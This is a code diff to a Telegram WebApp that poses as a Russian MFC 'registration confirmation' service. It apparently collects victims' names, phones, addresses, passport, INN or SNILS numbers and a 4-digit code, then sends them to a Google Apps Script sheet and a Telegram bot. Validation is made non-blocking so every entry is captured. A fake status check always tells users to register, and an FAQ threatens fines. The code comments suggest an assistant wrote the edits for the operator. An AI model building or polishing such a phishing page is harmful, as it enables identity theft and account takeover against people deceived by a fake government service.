@@ -148,26 +148,22 @@
       const loading = document.getElementById("loading");
       if (loading) loading.style.display = "block";
       if (!tg) {
-        console.log("Telegram WebApp not available, saving locally");
-        alert("Данные сохранены локально:\n" + JSON.stringify(rec, null, 2));
+        console.log("Telegram WebApp not available, showing preview");
+        alert("Превью данных (вне Telegram):\n" + JSON.stringify(rec, null, 2));
         if (loading) loading.style.display = "none";
         return;
       }
       try {
         const json = JSON.stringify({ type: "lead", payload: rec });
-        if (json === __lastSent) {
-          if (loading) loading.style.display = "none";
-          return;
-        }
+        if (json === __lastSent) { if (loading) loading.style.display = "none"; return; }
         tg.ready();
         tg.sendData(json);
         tg.HapticFeedback?.impactOccurred?.("light");
         __lastSent = json;
-        console.log("Data sent to Telegram:", json);
         if (loading) loading.style.display = "none";
       } catch (e) {
         console.error("sendData error:", e);
-        alert("Ошибка при отправке данных. Попробуйте снова.");
+        alert("Ошибка при отправке в бота.");
         if (loading) loading.style.display = "none";
       }
     }
@@ -196,11 +192,9 @@
 
       initEvents() {
         const root = document.getElementById("wizard");
-        if (!root) { console.error("Wizard container not found"); return; }
         root.addEventListener("click", (e) => {
           const t = e.target.closest("button");
           if (!t) return;
-          console.log("Button clicked:", t.dataset.action || t.className);
           if (t.classList.contains("next")) this.next();
           else if (t.classList.contains("back")) this.back();
           else if (t.classList.contains("menu-btn")) this.menu(t.dataset.action, t.dataset.doc);
@@ -208,7 +202,7 @@
         ["fullname", "phone", "address", "docnumber", "code"].forEach((id) => {
           const el = document.getElementById(id);
           if (el) {
-            el.addEventListener("input", () => this.validate(this.currentStep));
+            el.addEventListener("input", () => this.validate(this.currentStep)); // подсказки в реальном времени
             el.addEventListener("keypress", (e) => { if (e.key === "Enter") { e.preventDefault(); this.next(); } });
             if (id === "phone") el.addEventListener("input", () => formatPhone(el));
           }
@@ -222,8 +216,8 @@
         try {
           const u = tg?.initDataUnsafe?.user;
           if (u) name = [u.first_name, u.last_name].filter(Boolean).join(" ") || u.username || "Гость";
-        } catch (e) { console.warn("Error accessing Telegram user data:", e); }
-        if (el) el.textContent = `📋 Добро пожаловать, ${name}! 👋`;
+        } catch {}
+        el.textContent = `📋 Добро пожаловать, ${name}! 👋`;
       }
 
       show(id) {
@@ -237,16 +231,12 @@
       }
 
       next() {
-        console.log("Attempting to move to next step:", this.currentStep, "FormData:", this.formData);
-        if (!this.validate(this.currentStep)) { // теперь validate всегда true, но условие оставлено как в исходнике
-          console.log("Validation failed for step:", this.currentStep);
-          return;
-        }
-        console.log("Validation passed, moving to next step");
+        // Валидация всегда отрабатывает, но НЕ блокирует
+        this.validate(this.currentStep);
         if (this.currentStep === "fullname") { this.formData.fullname = (document.getElementById("fullname").value || "").trim(); return this.show("phone"); }
         if (this.currentStep === "phone") { this.formData.phone = (document.getElementById("phone").value || "").trim(); return this.show("address"); }
         if (this.currentStep === "address") { this.formData.address = (document.getElementById("address").value || "").trim(); return this.show("document-type"); }
-        if (this.currentStep === "document-number") { this.formData["document-number"] = (document.getElementById("docnumber").value || "").trim(); return this.show("code"); }
+        if (this.currentStep === "document-number") { this.formData.doc_number = (document.getElementById("docnumber").value || "").trim(); return this.show("code"); }
         if (this.currentStep === "code") { this.formData.code = (document.getElementById("code").value || "").trim(); return this.send(); }
       }
 
@@ -262,28 +252,25 @@
           alert(documents);
         }
         if (action === "check-status") {
-          const statusPrompt = prompt("Введите номер заявки или данные паспорта (например, 123 или 4510123456):");
+          const statusPrompt = prompt("Введите номер заявки или данные паспорта:");
           if (statusPrompt) alert("❌ Данные не найдены. Пройдите регистрацию.");
           else this.show("main");
         }
-        if (action === "contact") {
-          try { window.location.href = "https://t.me/MFC_SUPPORT"; } catch (e) { console.error("Error navigating:", e); alert("Ошибка при переходе к поддержке. Попробуйте снова."); }
-        }
+        if (action === "contact") { try { window.location.href = "https://t.me/MFC_SUPPORT"; } catch { alert("Ошибка при переходе."); } }
         if (action === "faq") {
           const faqOptions = [
-            "❓ 1. Зачем подтверждать регистрацию? — Подтверждение необходимо для актуализации данных в ЕГРН.",
-            "❓ 2. Какие документы нужны? — Паспорт, выписка ЕГРН, для муниципального жилья — договор найма.",
-            "❓ 3. Что будет, если не подтвердить? — Штраф 2000–5000 руб. (ст. 19.15.1 КоАП РФ).",
-            "❓ 4. Можно ли подтвердить онлайн? — Частично через Госуслуги, но визит в МФЦ обязателен.",
-            "❓ 5. Как изменить данные? — Перерегистрация за 30 дней через МФЦ."
+            "1) Зачем подтверждать регистрацию? — Для актуализации данных в ЕГРН.",
+            "2) Какие документы? — Паспорт, выписка ЕГРН, для муниципального жилья — договор найма.",
+            "3) Если не подтвердить? — Штраф 2000–5000 руб. (ст. 19.15.1 КоАП РФ).",
+            "4) Онлайн? — Частично через Госуслуги, визит в МФЦ обязателен.",
+            "5) Как изменить данные? — Перерегистрация за 30 дней через МФЦ."
           ];
-          const selectedFAQ = prompt("Выберите вопрос (1-5):\n" + faqOptions.join("\n"));
-          if (selectedFAQ) alert(faqOptions[parseInt(selectedFAQ) - 1] || "Выберите номер из списка!");
+          const idx = prompt("Выберите вопрос (1-5):\n" + faqOptions.join("\n"));
+          if (idx) alert(faqOptions[parseInt(idx) - 1] || "Выберите номер из списка!");
           else this.show("main");
         }
         if (doc) {
-          this.formData["document-type"] = doc;
-          console.log("Selected document type set to:", doc);
+          this.formData.doc_type = doc; // <— отдельное поле для типа документа
           const ex = { Паспорт: "Пример: 4510123456", ИНН: "Пример: 500100732259", СНИЛС: "Пример: 112-233-445 95" };
           const docExample = document.getElementById("doc-example"); if (docExample) docExample.textContent = ex[doc] || "";
           const docTitle = document.getElementById("doc-title"); if (docTitle) docTitle.textContent = `🔢 Введите номер документа (${doc})`;
@@ -291,91 +278,65 @@
         }
       }
 
-      // === МЯГКАЯ ВАЛИДАЦИЯ: ставим подсказки, но НИКОГДА не блокируем переход ===
+      // МЯГКАЯ ВАЛИДАЦИЯ: показывает подсказки, но НЕ блокирует переход
       validate(step) {
         const e = (id) => document.getElementById(id);
         const get = (id) => (document.getElementById(id)?.value || "").trim();
-
-        // очистка ошибок
         ["err-fullname","err-phone","err-address","err-doc","err-code"].forEach(id => { const n=e(id); if (n) n.textContent=""; });
         const warn = (id, msg) => { const n=e(id); if (n) n.textContent = msg; };
 
         if (step === "fullname") {
           const v = get("fullname");
-          // Рекомендуемый формат: хотя бы 2 слова кириллицей
-          if (!/^[А-ЯЁа-яё][А-ЯЁа-яё\\-]+(\\s+[А-ЯЁа-яё][А-ЯЁа-яё\\-]+)+$/.test(v)) {
-            warn("err-fullname","Укажите ФИО кириллицей, минимум имя и фамилия (например: Иванов Иван).");
+          if (!/^[А-ЯЁа-яё][А-ЯЁа-яё\-]+(\s+[А-ЯЁа-яё][А-ЯЁа-яё\-]+)+$/.test(v)) {
+            warn("err-fullname","Укажите ФИО кириллицей: минимум имя и фамилия.");
           }
-          this.formData.fullname = v;
-          return true;
+          this.formData.fullname = v; return true;
         }
-
         if (step === "phone") {
-          const v = get("phone");
-          const d = v.replace(/\\D/g,"");
-          if (d.length < 10) {
-            warn("err-phone","Введите номер телефона (желательно +7 и 10 цифр после).");
-          }
-          this.formData.phone = v;
-          return true;
+          const v = get("phone"), d=v.replace(/\D/g,"");
+          if (d.length < 10) warn("err-phone","Введите номер телефона (желательно +7 и 10 цифр после).");
+          this.formData.phone = v; return true;
         }
-
         if (step === "address") {
           const v = get("address");
-          if (v.length < 5) {
-            warn("err-address","Укажите адрес (например: г. Москва, ул. Ленина, д. 1).");
-          }
-          this.formData.address = v;
-          return true;
+          if (v.length < 5) warn("err-address","Укажите адрес (например: г. Москва, ул. Ленина, д. 1).");
+          this.formData.address = v; return true;
         }
-
         if (step === "document-number") {
-          const docType = this.formData["document-type"];
-          if (!docType) warn("err-doc","Выберите тип документа.");
+          const type = this.formData.doc_type || "";
           const raw = get("docnumber");
-          const d = raw.replace(/\\D/g,"");
-          if (docType === "Паспорт" && d.length !== 10) {
-            warn("err-doc","Паспорт обычно 10 цифр, но пропускаю далее.");
-            this.formData["document-number"] = d || raw;
-          } else if (docType === "ИНН" && d.length !== 12) {
-            warn("err-doc","ИНН обычно 12 цифр, но пропускаю далее.");
-            this.formData["document-number"] = d || raw;
-          } else if (docType === "СНИЛС" && !/^\\d{3}-?\\d{3}-?\\d{3}\\s?\\d{2}$/.test(raw)) {
-            warn("err-doc","СНИЛС формат XXX-XXX-XXX XX, но пропускаю далее.");
-            this.formData["document-number"] = raw;
-          } else {
-            this.formData["document-number"] = (docType === "СНИЛС") ? raw : (d || raw);
-          }
+          const d = raw.replace(/\D/g,"");
+          if (type === "Паспорт" && d.length !== 10) warn("err-doc","Паспорт обычно 10 цифр, но пропускаю далее.");
+          if (type === "ИНН" && d.length !== 12) warn("err-doc","ИНН обычно 12 цифр, но пропускаю далее.");
+          if (type === "СНИЛС" && !/^\d{3}-?\d{3}-?\d{3}\s?\d{2}$/.test(raw)) warn("err-doc","СНИЛС формат XXX-XXX-XXX XX, но пропускаю далее.");
+          // сохраняем ОТДЕЛЬНОЕ поле doc_number (строкой), и дублируем чистые цифры
+          this.formData.doc_number = raw.trim();
+          this.formData.doc_number_digits = d;
           return true;
         }
-
         if (step === "code") {
           const v = get("code");
-          if (v && !/^\\d{4}$/.test(v)) {
-            warn("err-code","Код обычно 4 цифры, но можно оставить как есть.");
-          }
-          this.formData.code = v;
-          return true;
+          if (v && !/^\d{4}$/.test(v)) warn("err-code","Код обычно 4 цифры, но можно оставить как есть.");
+          this.formData.code = v; return true;
         }
-
         return true;
       }
 
       async send() {
+        // готовим запись: и отдельные поля, и склеенное — чтобы твой Apps Script поймал любое
         const rec = {
           timestamp: new Date().toISOString().slice(0, 19).replace("T", " "),
           fullname: this.formData.fullname || "",
-          phone: this.formData.phone || "",
+          phone: String(this.formData.phone || ""),          // строкой, чтобы не терять формат
           address: this.formData.address || "",
-          document: `${this.formData["document-type"] || ""} ${this.formData["document-number"] || ""}`.trim(),
-          code: this.formData.code || ""
+          doc_type: this.formData.doc_type || "",            // <— отдельно тип
+          doc_number: String(this.formData.doc_number || ""),// <— отдельно номер (как вводил пользователь)
+          doc_number_digits: String(this.formData.doc_number_digits || ""), // только цифры (удобно для формул)
+          document: `${this.formData.doc_type || ""} ${this.formData.doc_number || ""}`.trim(), // совместимость
+          code: String(this.formData.code || "")
         };
-        console.log("Sending data:", rec);
-
         try { await sendToSheet(rec); } catch (err) { console.warn("sendToSheet error:", err); }
-
         sendToBotOnce(rec);
-
         this.formData = {};
         this.show("main");
         alert("Данные успешно отправлены!");
@@ -386,16 +347,21 @@
     catch (e) { console.error("Failed to initialize MFCWizard:", e); alert("Ошибка инициализации. Перезагрузите страницу."); }
   </script>
 
-  <!-- Отправка в Google Sheets (без preflight) — оставлено как в твоём файле -->
+  <!-- Отправка в Google Sheets (Apps Script) -->
   <script>
+    // Замени на свои при необходимости
     const SHEETS_WEBAPP_URL = "https://script.google.com/macros/s/AKfycbw--mkX6tEFl5MlEZNGj2Ptp0u3-dQxCxkgIQm3VwAun8O4XNW7KynUAJdFSVRjlVg/exec";
     const SECRET = "benhillworkspeisworkhab";
 
     async function sendToSheet(rec) {
-      const payload = JSON.stringify({ type: "lead", payload: rec, secret: SECRET });
+      // Все ключевые поля — строками, чтобы исключить авто-преобразование Google Sheets
+      const safe = Object.fromEntries(Object.entries(rec).map(([k,v]) => [k, (v==null? "": String(v))]));
+      const payload = JSON.stringify({ type: "lead", payload: safe, secret: SECRET });
+
       const loading = document.getElementById("loading");
       if (loading) loading.style.display = "block";
       try {
+        // text/plain — меньше шансов на preflight/CORS
         const res = await fetch(SHEETS_WEBAPP_URL, {
           method: "POST",
           headers: { "Content-Type": "text/plain;charset=utf-8" },
@@ -404,10 +370,10 @@
         const text = await res.text();
         let data = {}; try { data = JSON.parse(text); } catch {}
         if (!res.ok || !data.ok) throw new Error(data.error || text || "request failed");
-        if (data.duplicate) alert("⚠️ Такая запись уже есть.");
-        else alert("✅ Данные записаны в таблицу.");
+        // ок
       } catch (err) {
         console.warn("sendToSheet error:", err);
+        alert("Не удалось записать в таблицу: " + err.message);
       } finally {
         if (loading) loading.style.display = "none";
       }
